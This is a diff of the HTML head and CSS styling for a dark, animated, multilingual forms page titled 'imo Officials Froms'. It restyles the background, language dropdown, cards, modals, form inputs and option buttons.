@@ -5,13 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>imo Officials Froms - Ultimate Advanced UI</title>
     
-    <!-- Premium Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@500;700&family=Hind+Siliguri:wght@400;500;600;700&family=Noto+Sans+Arabic:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;700&family=Hind+Siliguri:wght@400;500;600;700&family=Noto+Sans+Arabic:wght@400;600;700&display=swap" rel="stylesheet">
 
     <style>
-        /* --- Base Resets & Variables --- */
         :root {
             --bg-color: #030303;
             --text-primary: #ffffff;
@@ -25,6 +23,8 @@
 
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
+        html { scroll-behavior: smooth; }
+
         body {
             background-color: var(--bg-color); color: var(--text-primary); min-height: 100vh;
             display: flex; justify-content: center; align-items: center; padding: 20px;
@@ -36,120 +36,123 @@
         body[dir="rtl"] { font-family: 'Noto Sans Arabic', 'Inter', sans-serif; }
 
         /* =========================================
-           ULTRA-ADVANCED BACKGROUND ENGINE
+           BACKGROUND ENGINE
            ========================================= */
-        .bg-container {
-            position: fixed; inset: 0; z-index: -1; overflow: hidden;
-        }
-
+        .bg-container { position: fixed; inset: 0; z-index: -1; overflow: hidden; }
+        
         .bg-image {
             position: absolute; inset: 0;
             background-image: var(--bg-image-url);
             background-size: cover; background-position: center;
-            filter: brightness(0.4) contrast(1.2);
+            filter: brightness(0.35) contrast(1.2) saturate(1.2); 
             z-index: 1;
-            transition: transform 10s ease;
+            animation: bgZoom 20s ease-in-out infinite alternate;
         }
-
-        .bg-container:hover .bg-image { transform: scale(1.05); }
-
+        @keyframes bgZoom { 0% { transform: scale(1); } 100% { transform: scale(1.1); } }
+        
         .bg-overlay {
             position: absolute; inset: 0;
-            background: linear-gradient(135deg, rgba(3,3,3,0.8) 0%, rgba(3,3,3,0.95) 100%);
-            z-index: 2; backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);
+            background: 
+                radial-gradient(circle at 20% 20%, rgba(var(--c1-rgb), 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(var(--c2-rgb), 0.15) 0%, transparent 50%),
+                linear-gradient(135deg, rgba(3,3,3,0.85) 0%, rgba(3,3,3,0.95) 100%);
+            z-index: 2; 
+            backdrop-filter: blur(8px); 
+            -webkit-backdrop-filter: blur(8px);
+            animation: overlayPulse 15s ease-in-out infinite alternate;
         }
-
+        @keyframes overlayPulse {
+            0% { opacity: 0.9; }
+            100% { opacity: 1; }
+        }
+        
         #particle-canvas { position: absolute; inset: 0; z-index: 3; pointer-events: none; }
-
+        
         .cursor-glow {
-            position: fixed; width: 300px; height: 300px; border-radius: 50%;
-            background: radial-gradient(circle, rgba(0, 242, 254, 0.12) 0%, transparent 70%);
+            position: fixed; width: 350px; height: 350px; border-radius: 50%;
+            background: radial-gradient(circle, rgba(var(--c1-rgb), 0.15) 0%, transparent 70%);
             pointer-events: none; transform: translate(-50%, -50%);
             z-index: 9999; transition: opacity 0.3s ease; mix-blend-mode: screen;
+            filter: blur(20px);
         }
 
         /* =========================================
-           ADVANCED CUSTOM LANGUAGE DROPDOWN
+           LANGUAGE SELECTOR
            ========================================= */
         .lang-selector {
             position: fixed; top: 20px; right: 20px; z-index: 10000;
             display: flex; flex-direction: column; align-items: flex-end;
         }
-        
-        /* RTL Fix for Language Selector */
         body[dir="rtl"] .lang-selector { right: auto; left: 20px; align-items: flex-start; }
-
+        
         .lang-trigger {
-            background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 12px; padding: 10px 15px; backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px); display: flex; align-items: center; gap: 8px;
-            cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            color: #fff; font-family: 'Space Grotesk', sans-serif; font-size: 0.9rem;
+            background: rgba(255, 255, 255, 0.06); border: 1.5px solid rgba(255, 255, 255, 0.12);
+            border-radius: 14px; padding: 10px 16px; backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px); display: flex; align-items: center; gap: 8px;
+            cursor: pointer; transition: all 0.3s ease; box-shadow: 0 8px 25px rgba(0,0,0,0.5);
+            color: #fff; font-family: 'Space Grotesk', sans-serif; font-size: 0.9rem; font-weight: 500;
         }
-
-        .lang-trigger:hover {
-            background: rgba(255, 255, 255, 0.1); border-color: rgba(0, 242, 254, 0.4);
-            box-shadow: 0 0 20px rgba(0, 242, 254, 0.2);
+        .lang-trigger:hover { 
+            background: rgba(255, 255, 255, 0.12); 
+            border-color: rgba(var(--c1-rgb), 0.5); 
+            box-shadow: 0 0 25px rgba(var(--c1-rgb), 0.3);
+            transform: translateY(-2px);
         }
-
         .lang-trigger svg { width: 16px; height: 16px; color: var(--c1); transition: transform 0.3s ease; }
         .lang-trigger .chevron { width: 12px; height: 12px; transition: transform 0.3s ease; }
         .lang-selector.active .lang-trigger .chevron { transform: rotate(180deg); }
-
+        
         .lang-dropdown {
-            position: absolute; top: 100%; right: 0; margin-top: 10px; width: 150px;
-            background: rgba(15, 15, 15, 0.95); border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 14px; padding: 8px; backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8), inset 0 0 20px rgba(255, 255, 255, 0.02);
+            position: absolute; top: 100%; right: 0; margin-top: 10px; width: 170px;
+            background: rgba(15, 15, 15, 0.95); border: 1.5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px; padding: 8px; backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.8), inset 0 0 20px rgba(255, 255, 255, 0.02);
             opacity: 0; visibility: hidden; transform: translateY(-10px) scale(0.95);
             transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); z-index: 10001;
         }
-
         body[dir="rtl"] .lang-dropdown { right: auto; left: 0; }
-
-        .lang-selector.active .lang-dropdown {
-            opacity: 1; visibility: visible; transform: translateY(0) scale(1);
-        }
-
+        .lang-selector.active .lang-dropdown { opacity: 1; visibility: visible; transform: translateY(0) scale(1); }
+        
         .lang-option {
-            padding: 10px 12px; border-radius: 8px; cursor: pointer; transition: all 0.2s ease;
+            padding: 10px 12px; border-radius: 10px; cursor: pointer; transition: all 0.2s ease;
             display: flex; align-items: center; justify-content: space-between;
             font-size: 0.9rem; color: rgba(255, 255, 255, 0.8);
         }
-
-        .lang-option:hover { background: rgba(255, 255, 255, 0.08); color: #fff; }
-        .lang-option.active { color: var(--c1); font-weight: 600; background: rgba(0, 242, 254, 0.1); }
+        .lang-option:hover { background: rgba(255, 255, 255, 0.08); color: #fff; transform: translateX(3px); }
+        .lang-option.active { color: var(--c1); font-weight: 600; background: rgba(var(--c1-rgb), 0.1); }
         .lang-option.active::after { content: '✓'; color: var(--c1); font-size: 0.8rem; }
 
         /* =========================================
-           MAIN UI & ADVANCED TEXT ANIMATION
+           MAIN APP
            ========================================= */
         .app-container { width: 100%; max-width: 420px; display: flex; flex-direction: column; align-items: center; gap: 25px; z-index: 10; padding: 20px 0; }
-
+        
         h1 {
             font-family: 'Space Grotesk', sans-serif; font-size: 1.8rem; font-weight: 700; text-transform: uppercase;
             background: linear-gradient(90deg, #00f2fe, #b224ef, #ff0844, #00e676, #ffb800, #00f2fe); 
             background-size: 400% 400%;
             color: transparent; -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.15)); 
-            animation: gradientFlow 8s ease infinite; text-align: center;
+            filter: drop-shadow(0 0 25px rgba(255, 255, 255, 0.15)); 
+            animation: gradientFlow 8s ease infinite; text-align: center; letter-spacing: 1px;
         }
         @keyframes gradientFlow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
 
         .grid-container { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; width: 100%; transform-style: preserve-3d; }
-
+        
         .card-wrapper { opacity: 0; transform: translateY(30px); animation: slideUpFade 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
         .card-wrapper.c1 { animation-delay: 0.1s; } .card-wrapper.c2 { animation-delay: 0.2s; }
         .card-wrapper.c3 { animation-delay: 0.3s; } .card-wrapper.c4 { animation-delay: 0.4s; }
         .card-wrapper.c5 { animation-delay: 0.5s; grid-column: span 2; }
 
         .card {
-            position: relative; border-radius: 20px; overflow: hidden; cursor: pointer; background: rgba(20, 20, 20, 0.6);
-            border: 1.5px solid rgba(255, 255, 255, 0.08); box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            transition: transform 0.1s ease-out, box-shadow 0.4s ease; transform-style: preserve-3d; will-change: transform;
-            backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
+            position: relative; border-radius: 20px; overflow: hidden; cursor: pointer; 
+            background: rgba(20, 20, 20, 0.5);
+            border: 1.5px solid rgba(255, 255, 255, 0.08); 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            transition: transform 0.1s ease-out, box-shadow 0.4s ease, border-color 0.4s ease;
+            transform-style: preserve-3d; will-change: transform;
+            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
         }
-
         .card-wrapper.c1 .card { --accent: var(--c1); --accent-rgb: var(--c1-rgb); }
         .card-wrapper.c2 .card { --accent: var(--c2); --accent-rgb: var(--c2-rgb); }
         .card-wrapper.c3 .card { --accent: var(--c3); --accent-rgb: var(--c3-rgb); }
@@ -162,35 +165,47 @@
             animation: spinBorder 4s linear infinite; opacity: 0; transition: opacity 0.4s ease; z-index: 1;
         }
         .card::after {
-            content: ''; position: absolute; inset: 1.5px; background: linear-gradient(145deg, rgba(20, 20, 20, 0.9), rgba(8, 8, 8, 0.95));
-            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border-radius: 18.5px; z-index: 2; transition: background 0.4s ease;
+            content: ''; position: absolute; inset: 1.5px; 
+            background: linear-gradient(145deg, rgba(20, 20, 20, 0.92), rgba(8, 8, 8, 0.96));
+            backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); 
+            border-radius: 18.5px; z-index: 2; transition: background 0.4s ease;
         }
-
         .card-sheen {
             position: absolute; top: 0; left: -150%; width: 60%; height: 100%;
-            background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0) 100%);
-            transform: skewX(-25deg); transition: all 0.7s cubic-bezier(0.16, 1, 0.3, 1); z-index: 4; pointer-events: none;
+            background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.2) 50%, rgba(255,255,255,0) 100%);
+            transform: skewX(-25deg); transition: all 0.7s cubic-bezier(0.16, 1, 0.3, 1); 
+            z-index: 4; pointer-events: none;
         }
         .card:hover .card-sheen { left: 200%; }
-
+        
         .card-content {
-            position: relative; z-index: 3; padding: 20px; display: flex; flex-direction: row; align-items: center; justify-content: flex-start;
-            gap: 15px; min-height: 100px; height: 100%; transform: translateZ(30px); transform-style: preserve-3d;
+            position: relative; z-index: 3; padding: 20px; display: flex; flex-direction: row; 
+            align-items: center; justify-content: flex-start; gap: 15px; min-height: 100px; height: 100%; 
+            transform: translateZ(30px); transform-style: preserve-3d;
         }
-
+        
         .icon-wrapper {
-            width: 46px; height: 46px; border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 14px; background: rgba(255, 255, 255, 0.05);
-            display: flex; align-items: center; justify-content: center; transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            width: 46px; height: 46px; border: 1.5px solid rgba(255, 255, 255, 0.12); 
+            border-radius: 14px; background: rgba(255, 255, 255, 0.05);
+            display: flex; align-items: center; justify-content: center; 
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             position: relative; overflow: hidden; flex-shrink: 0; transform: translateZ(20px);
         }
-        .icon-wrapper::before { content: ''; position: absolute; inset: 0; background: radial-gradient(circle at center, var(--accent) 0%, transparent 70%); opacity: 0; transition: opacity 0.4s ease; }
+        .icon-wrapper::before { 
+            content: ''; position: absolute; inset: 0; 
+            background: radial-gradient(circle at center, var(--accent) 0%, transparent 70%); 
+            opacity: 0; transition: opacity 0.4s ease; 
+        }
         .icon-wrapper svg { width: 22px; height: 22px; color: rgba(255, 255, 255, 0.7); transition: all 0.4s ease; position: relative; z-index: 1; }
-
+        
         .card-text {
-            font-family: 'Inter', 'Hind Siliguri', 'Noto Sans Arabic', sans-serif; font-size: 1.1rem; line-height: 1.4; font-weight: 600; position: relative; display: inline-block;
-            background: linear-gradient(180deg, #ffffff 0%, #8a8a8a 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1); transform: translateZ(40px);
-            text-align: left;
+            font-family: 'Inter', 'Hind Siliguri', 'Noto Sans Arabic', sans-serif; 
+            font-size: 1.1rem; line-height: 1.4; font-weight: 600; 
+            position: relative; display: inline-block;
+            background: linear-gradient(180deg, #ffffff 0%, #8a8a8a 100%); 
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1); 
+            transform: translateZ(40px); text-align: left;
         }
         body[dir="rtl"] .card-text { text-align: right; }
         
@@ -201,68 +216,88 @@
         }
         body[dir="rtl"] .card-text::after { left: auto; right: 0; }
 
-        .card:hover { box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 0 0 40px rgba(var(--accent-rgb), 0.2); border-color: rgba(var(--accent-rgb), 0.3); }
+        .card:hover { 
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 0 0 40px rgba(var(--accent-rgb), 0.25); 
+            border-color: rgba(var(--accent-rgb), 0.4); 
+        }
         .card:hover::before { opacity: 1; }
-        .card:hover::after { background: linear-gradient(145deg, rgba(15, 15, 15, 0.95), rgba(4, 4, 4, 0.98)); }
+        .card:hover::after { background: linear-gradient(145deg, rgba(15, 15, 15, 0.96), rgba(4, 4, 4, 0.99)); }
         .card:hover .card-text {
-            background: linear-gradient(180deg, #ffffff 0%, var(--accent) 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            filter: drop-shadow(0 0 15px rgba(var(--accent-rgb), 0.6)); transform: translateZ(60px) scale(1.05); letter-spacing: 0.5px;
+            background: linear-gradient(180deg, #ffffff 0%, var(--accent) 100%); 
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 0 15px rgba(var(--accent-rgb), 0.6)); 
+            transform: translateZ(60px) scale(1.05); letter-spacing: 0.5px;
         }
         .card:hover .card-text::after { width: 100%; }
-        .card:hover .icon-wrapper { border-color: rgba(var(--accent-rgb), 0.5); transform: translateZ(40px) scale(1.1); box-shadow: 0 0 20px rgba(var(--accent-rgb), 0.3); }
-        .card:hover .icon-wrapper::before { opacity: 0.2; }
+        .card:hover .icon-wrapper { 
+            border-color: rgba(var(--accent-rgb), 0.6); 
+            transform: translateZ(40px) scale(1.1); 
+            box-shadow: 0 0 20px rgba(var(--accent-rgb), 0.4); 
+        }
+        .card:hover .icon-wrapper::before { opacity: 0.25; }
         .card:hover .icon-wrapper svg { color: #ffffff; filter: drop-shadow(0 0 8px rgba(var(--accent-rgb), 0.8)); }
 
         .info-panel {
-            width: 100%; background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; padding: 20px;
-            backdrop-filter: blur(15px); box-shadow: inset 0 0 20px rgba(255, 255, 255, 0.02), 0 10px 30px rgba(0,0,0,0.5);
-            opacity: 0; transform: translateY(30px); animation: slideUpFade 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards; animation-delay: 0.6s;
-            position: relative; overflow: hidden; transition: all 0.4s ease;
+            width: 100%; background: rgba(255, 255, 255, 0.02); 
+            border: 1.5px solid rgba(255, 255, 255, 0.08); border-radius: 18px; padding: 22px;
+            backdrop-filter: blur(20px); 
+            box-shadow: inset 0 0 20px rgba(255, 255, 255, 0.02), 0 10px 30px rgba(0,0,0,0.5);
+            opacity: 0; transform: translateY(30px); 
+            animation: slideUpFade 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards; animation-delay: 0.6s;
+            position: relative; overflow: hidden;
         }
-        .info-panel:hover { border-color: rgba(0, 242, 254, 0.3); box-shadow: 0 0 30px rgba(0, 242, 254, 0.1); }
         .info-panel::before {
             content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px;
-            background: linear-gradient(90deg, transparent, var(--c1), transparent); animation: scanline 4s linear infinite;
+            background: linear-gradient(90deg, transparent, var(--c1), transparent); 
+            animation: scanline 4s linear infinite;
         }
         @keyframes scanline { 0% { top: 0; opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
-        .info-panel h2 { font-family: 'Space Grotesk', sans-serif; font-size: 1.1rem; font-weight: 700; color: var(--c1); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; text-shadow: 0 0 10px rgba(var(--c1-rgb), 0.3); }
-        .info-panel p { font-family: 'Inter', 'Hind Siliguri', 'Noto Sans Arabic', sans-serif; font-size: 0.9rem; line-height: 1.6; color: rgba(255, 255, 255, 0.7); }
+        .info-panel h2 { 
+            font-family: 'Space Grotesk', sans-serif; font-size: 1.1rem; font-weight: 700; 
+            color: var(--c1); margin-bottom: 8px; text-transform: uppercase; 
+            letter-spacing: 1px; text-shadow: 0 0 10px rgba(var(--c1-rgb), 0.3); 
+        }
+        .info-panel p { 
+            font-family: 'Inter', 'Hind Siliguri', 'Noto Sans Arabic', sans-serif; 
+            font-size: 0.9rem; line-height: 1.6; color: rgba(255, 255, 255, 0.75); 
+        }
 
         /* =========================================
-           MODAL ENGINE & ADVANCED TEXT ANIMATION
+           MODAL ENGINE
            ========================================= */
         .modal-overlay {
-            position: fixed; inset: 0; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
+            position: fixed; inset: 0; background: rgba(0, 0, 0, 0.7); 
+            backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
             z-index: 1000; display: flex; justify-content: center; align-items: center; padding: 20px;
-            opacity: 0; visibility: hidden; transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            opacity: 0; visibility: hidden; transition: all 0.35s cubic-bezier(0.16, 1, 0.3, 1);
         }
         .modal-overlay.active { opacity: 1; visibility: visible; }
-
+        
         .modal-box {
-            background: linear-gradient(145deg, rgba(20, 20, 20, 0.95), rgba(8, 8, 8, 0.98));
-            border: 1.5px solid rgba(255, 255, 255, 0.1); border-radius: 24px; padding: 30px 25px; width: 100%; max-width: 360px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.9), inset 0 0 20px rgba(255, 255, 255, 0.02);
-            transform: translateY(30px) scale(0.95); transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            background: linear-gradient(145deg, rgba(20, 20, 20, 0.96), rgba(8, 8, 8, 0.99));
+            border: 1.5px solid rgba(255, 255, 255, 0.1); border-radius: 26px; 
+            padding: 30px 25px; width: 100%; max-width: 380px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.9), inset 0 0 30px rgba(255, 255, 255, 0.02);
+            transform: translateY(30px) scale(0.95); 
+            transition: all 0.35s cubic-bezier(0.16, 1, 0.3, 1);
             position: relative; overflow: hidden; max-height: 90vh; overflow-y: auto;
         }
         .modal-box::-webkit-scrollbar { width: 4px; }
         .modal-box::-webkit-scrollbar-track { background: rgba(255,255,255,0.05); border-radius: 4px; }
         .modal-box::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 4px; }
-
         .modal-overlay.active .modal-box { transform: translateY(0) scale(1); }
 
-        /* Dynamic Modal Glows */
-        .modal-c1 .modal-box { border-color: rgba(var(--c1-rgb), 0.3); box-shadow: 0 25px 50px rgba(0,0,0,0.9), 0 0 40px rgba(var(--c1-rgb), 0.15); }
-        .modal-c2 .modal-box { border-color: rgba(var(--c2-rgb), 0.3); box-shadow: 0 25px 50px rgba(0,0,0,0.9), 0 0 40px rgba(var(--c2-rgb), 0.15); }
-        .modal-c3 .modal-box { border-color: rgba(var(--c3-rgb), 0.3); box-shadow: 0 25px 50px rgba(0,0,0,0.9), 0 0 40px rgba(var(--c3-rgb), 0.15); }
-        .modal-c4 .modal-box { border-color: rgba(var(--c4-rgb), 0.3); box-shadow: 0 25px 50px rgba(0,0,0,0.9), 0 0 40px rgba(var(--c4-rgb), 0.15); }
-        .modal-c5 .modal-box { border-color: rgba(var(--c5-rgb), 0.3); box-shadow: 0 25px 50px rgba(0,0,0,0.9), 0 0 40px rgba(var(--c5-rgb), 0.15); }
+        .modal-c1 .modal-box { border-color: rgba(var(--c1-rgb), 0.35); box-shadow: 0 25px 50px rgba(0,0,0,0.9), 0 0 50px rgba(var(--c1-rgb), 0.2); }
+        .modal-c2 .modal-box { border-color: rgba(var(--c2-rgb), 0.35); box-shadow: 0 25px 50px rgba(0,0,0,0.9), 0 0 50px rgba(var(--c2-rgb), 0.2); }
+        .modal-c3 .modal-box { border-color: rgba(var(--c3-rgb), 0.35); box-shadow: 0 25px 50px rgba(0,0,0,0.9), 0 0 50px rgba(var(--c3-rgb), 0.2); }
+        .modal-c4 .modal-box { border-color: rgba(var(--c4-rgb), 0.35); box-shadow: 0 25px 50px rgba(0,0,0,0.9), 0 0 50px rgba(var(--c4-rgb), 0.2); }
+        .modal-c5 .modal-box { border-color: rgba(var(--c5-rgb), 0.35); box-shadow: 0 25px 50px rgba(0,0,0,0.9), 0 0 50px rgba(var(--c5-rgb), 0.2); }
 
         .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
         
-        /* Advanced Animated Modal Title Text */
         .modal-title { 
-            font-family: 'Space Grotesk', 'Hind Siliguri', 'Noto Sans Arabic', sans-serif; font-size: 1.3rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; 
+            font-family: 'Space Grotesk', 'Hind Siliguri', 'Noto Sans Arabic', sans-serif; 
+            font-size: 1.3rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; 
             background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent;
             animation: titleShimmer 3s linear infinite;
         }
@@ -271,135 +306,129 @@
         .modal-c3 .modal-title { background-image: linear-gradient(90deg, var(--c3), #ffffff, var(--c3)); filter: drop-shadow(0 0 10px rgba(var(--c3-rgb), 0.4)); }
         .modal-c4 .modal-title { background-image: linear-gradient(90deg, var(--c4), #ffffff, var(--c4)); filter: drop-shadow(0 0 10px rgba(var(--c4-rgb), 0.4)); }
         .modal-c5 .modal-title { background-image: linear-gradient(90deg, var(--c5), #ffffff, var(--c5)); filter: drop-shadow(0 0 10px rgba(var(--c5-rgb), 0.4)); }
-        
         @keyframes titleShimmer { to { background-position: 200% center; } }
 
         .close-btn {
             background: rgba(255, 255, 255, 0.05); border: none; color: rgba(255, 255, 255, 0.6);
-            width: 32px; height: 32px; border-radius: 50%; display: flex; justify-content: center; align-items: center;
-            font-size: 1.2rem; cursor: pointer; transition: all 0.3s ease; flex-shrink: 0;
+            width: 34px; height: 34px; border-radius: 50%; display: flex; justify-content: center; align-items: center;
+            font-size: 1.3rem; cursor: pointer; transition: all 0.3s ease; flex-shrink: 0;
         }
         .close-btn:hover { background: rgba(255, 255, 255, 0.15); color: #fff; transform: rotate(90deg); }
 
-        /* Modal Form Elements */
         .form-group { margin-bottom: 20px; position: relative; }
-        .form-group label { display: block; font-family: 'Inter', 'Hind Siliguri', 'Noto Sans Arabic', sans-serif; font-size: 0.85rem; color: rgba(255,255,255,0.7); margin-bottom: 8px; line-height: 1.4; }
+        .form-group label { 
+            display: block; font-family: 'Inter', 'Hind Siliguri', 'Noto Sans Arabic', sans-serif; 
+            font-size: 0.85rem; color: rgba(255,255,255,0.75); margin-bottom: 8px; line-height: 1.4; font-weight: 500;
+        }
         
         .form-input {
-            width: 100%; background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 12px; padding: 14px 16px; color: #fff; font-family: 'Inter', 'Hind Siliguri', 'Noto Sans Arabic', sans-serif; font-size: 0.95rem;
+            width: 100%; background: rgba(0, 0, 0, 0.5); border: 1.5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px; padding: 14px 16px; color: #fff; 
+            font-family: 'Inter', 'Hind Siliguri', 'Noto Sans Arabic', sans-serif; font-size: 0.95rem;
             outline: none; transition: all 0.3s ease; margin-bottom: 10px;
         }
         .form-input:focus { background: rgba(0, 0, 0, 0.8); }
-        
-        .modal-c1 .form-input:focus { border-color: var(--c1); box-shadow: 0 0 15px rgba(var(--c1-rgb), 0.2); }
-        .modal-c2 .form-input:focus { border-color: var(--c2); box-shadow: 0 0 15px rgba(var(--c2-rgb), 0.2); }
-        .modal-c3 .form-input:focus { border-color: var(--c3); box-shadow: 0 0 15px rgba(var(--c3-rgb), 0.2); }
-        .modal-c4 .form-input:focus { border-color: var(--c4); box-shadow: 0 0 15px rgba(var(--c4-rgb), 0.2); }
-        .modal-c5 .form-input:focus { border-color: var(--c5); box-shadow: 0 0 15px rgba(var(--c5-rgb), 0.2); }
+        .modal-c1 .form-input:focus { border-color: var(--c1); box-shadow: 0 0 20px rgba(var(--c1-rgb), 0.25); }
+        .modal-c2 .form-input:focus { border-color: var(--c2); box-shadow: 0 0 20px rgba(var(--c2-rgb), 0.25); }
+        .modal-c3 .form-input:focus { border-color: var(--c3); box-shadow: 0 0 20px rgba(var(--c3-rgb), 0.25); }
+        .modal-c4 .form-input:focus { border-color: var(--c4); box-shadow: 0 0 20px rgba(var(--c4-rgb), 0.25); }
+        .modal-c5 .form-input:focus { border-color: var(--c5); box-shadow: 0 0 20px rgba(var(--c5-rgb), 0.25); }
 
-        /* Selection Buttons */
         .limit-options { display: flex; justify-content: space-between; gap: 10px; margin-top: 10px; margin-bottom: 25px; flex-wrap: wrap; }
         .limit-btn {
-            flex: 1; padding: 12px 0; background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 10px; color: rgba(255, 255, 255, 0.7); font-family: 'Space Grotesk', sans-serif;
-            font-size: 0.9rem; font-weight: 600; cursor: pointer; transition: all 0.3s ease; outline: none;
-            min-width: 70px;
+            flex: 1; padding: 12px 0; background: rgba(255, 255, 255, 0.03); 
+            border: 1.5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px; color: rgba(255, 255, 255, 0.7); 
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 0.9rem; font-weight: 600; cursor: pointer; 
+            transition: all 0.3s ease; outline: none; min-width: 70px;
         }
-        
-        .modal-c1 .limit-btn:hover, .modal-c1 .limit-btn.active { background: rgba(var(--c1-rgb), 0.15); border-color: var(--c1); color: var(--c1); box-shadow: 0 0 15px rgba(var(--c1-rgb), 0.2); text-shadow: 0 0 10px rgba(var(--c1-rgb), 0.4); }
-        .modal-c2 .limit-btn:hover, .modal-c2 .limit-btn.active { background: rgba(var(--c2-rgb), 0.15); border-color: var(--c2); color: var(--c2); box-shadow: 0 0 15px rgba(var(--c2-rgb), 0.2); text-shadow: 0 0 10px rgba(var(--c2-rgb), 0.4); }
-        .modal-c3 .limit-btn:hover, .modal-c3 .limit-btn.active { background: rgba(var(--c3-rgb), 0.15); border-color: var(--c3); color: var(--c3); box-shadow: 0 0 15px rgba(var(--c3-rgb), 0.2); text-shadow: 0 0 10px rgba(var(--c3-rgb), 0.4); }
-        .modal-c4 .limit-btn:hover, .modal-c4 .limit-btn.active { background: rgba(var(--c4-rgb), 0.15); border-color: var(--c4); color: var(--c4); box-shadow: 0 0 15px rgba(var(--c4-rgb), 0.2); text-shadow: 0 0 10px rgba(var(--c4-rgb), 0.4); }
-        .modal-c5 .limit-btn:hover, .modal-c5 .limit-btn.active { background: rgba(var(--c5-rgb), 0.15); border-color: var(--c5); color: var(--c5); box-shadow: 0 0 15px rgba(var(--c5-rgb), 0.2); text-shadow: 0 0 10px rgba(var(--c5-rgb), 0.4); }
+        .modal-c1 .limit-btn:hover, .modal-c1 .limit-btn.active { background: rgba(var(--c1-rgb), 0.15); border-color: var(--c1); color: var(--c1); box-shadow: 0 0 15px rgba(var(--c1-rgb), 0.25); text-shadow: 0 0 10px rgba(var(--c1-rgb), 0.4); }
+        .modal-c2 .limit-btn:hover, .modal-c2 .limit-btn.active { background: rgba(var(--c2-rgb), 0.15); border-color: var(--c2); color: var(--c2); box-shadow: 0 0 15px rgba(var(--c2-rgb), 0.25); text-shadow: 0 0 10px rgba(var(--c2-rgb), 0.4); }
+        .modal-c3 .limit-btn:hover, .modal-c3 .limit-btn.active { background: rgba(var(--c3-rgb), 0.15); border-color: var(--c3); color: var(--c3); box-shadow: 0 0 15px rgba(var(--c3-rgb), 0.25); text-shadow: 0 0 10px rgba(var(--c3-rgb), 0.4); }
+        .modal-c4 .limit-btn:hover, .modal-c4 .limit-btn.active { background: rgba(var(--c4-rgb), 0.15); border-color: var(--c4); color: var(--c4); box-shadow: 0 0 15px rgba(var(--c4-rgb), 0.25); text-shadow: 0 0 10px rgba(var(--c4-rgb), 0.4); }
